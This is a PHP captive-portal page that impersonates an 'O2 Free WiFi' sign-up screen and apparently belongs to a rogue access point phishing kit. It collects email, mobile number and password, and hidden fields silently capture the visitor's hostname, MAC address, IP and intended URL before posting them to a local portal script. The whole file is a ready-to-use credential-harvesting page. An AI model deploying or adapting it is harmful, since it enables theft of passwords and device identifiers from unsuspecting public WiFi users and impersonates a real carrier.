<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>

<head>

    <title>O2 - Sign Up</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
    <meta name="theme-color" content="#5170ad" />

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              window.location = "/captiveportal/index.php";
            }, 100);
          }
    </script>

    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
    <link rel='stylesheet prefetch' href='assets/css/style.css'>
    <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
    <link rel="icon" type="image/png" href="assets/img/ymwp832k1s.png" />

</head>

<body>

    <section class="login-form-wrap">

        <h1 class="disable-selection"><img src="assets/img/logo-white.png" height="80px" width="80px"></h1>

        <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">

            <center>

            <h2>Sign up to access O<sub>2</sub> Free WiFi</h2>

            <input type="text" name="email" placeholder="Email address" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>

            <input type="number" name="mobile" placeholder="UK mobile number" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>

            <input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required>

            </center>

            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <input type="submit" value="Sign up">

        </form>

        <h5><a href="#" class="disable-selection">Signed up already? Log in here</a></h5>
        <h5><a href="#" class="disable-selection">Contact us</a></h5>

    </section>

</body>

</html>
